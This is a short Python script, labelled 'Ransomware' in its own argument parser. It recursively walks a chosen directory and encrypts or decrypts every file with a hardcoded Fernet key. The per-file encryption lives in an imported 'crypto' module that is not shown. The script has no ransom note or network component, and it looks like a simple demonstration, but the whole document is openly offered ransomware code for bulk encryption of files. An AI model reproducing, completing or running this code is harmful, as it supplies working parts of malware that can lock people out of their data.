from cryptography.fernet import Fernet

import argparse
import crypto
import os

KEY = b'tPIiLSsTWzJ5uXUHpl4OtE2qcN1G9ol992HUsOmJO7Y='


def walk_files(path):
    for dirpath, _, files in os.walk(path):
        for i in files:
            file_path = os.path.abspath(os.path.join(dirpath, i))
            yield file_path


def main():
    parser = argparse.ArgumentParser(description='Ransomware')
    parser.add_argument(
        '-e', '--encrypt', help='encrypt files', action="store_true")
    parser.add_argument(
        '-d', '--decrypt', help='decrypt files', action="store_true")
    parser.add_argument('directory', help='directory to encrypt or decrypt')

    args = vars(parser.parse_args())
    decrypt = args['decrypt']
    encrypt = args['encrypt']

    fernet = Fernet(KEY)

    if decrypt:
        for file in walk_files(args['directory']):
            crypto.decrypt(file, fernet)

    elif encrypt:
        for file in walk_files(args['directory']):
            crypto.encrypt(file, fernet)


if __name__ == '__main__':
    main()
